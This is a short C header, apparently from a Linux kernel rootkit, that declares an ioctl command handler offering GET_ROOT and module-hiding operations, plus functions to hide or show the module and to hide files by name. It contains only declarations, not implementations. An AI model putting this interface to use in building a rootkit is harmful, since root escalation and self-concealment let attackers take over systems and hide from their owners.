#include <linux/mutex.h>
#include "devices.h"
#include "fs_helper.h"
#include "internel.h"
#include "syscall_helper.h"

enum operation_num { GET_ROOT, SHOW_MODULE, HIDE_MODULE };

struct name_list {
    char *name;
    struct list_head list;
};

/**
 * cmd_ioctl - VFS interface to execute command
 */
long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg);

void utils_init(void);

/**
 * hide_module - Hide the current module
 */
void hide_module(void);

/**
 * show_module - Show the current module
 */
void show_module(void);

/**
 * hide_file - Hide the file with substring name.
 */
void hide_file(const char *name);

/**
 * show_file - Show the file hided by `hide_file`.
 */
void show_file(const char *name);
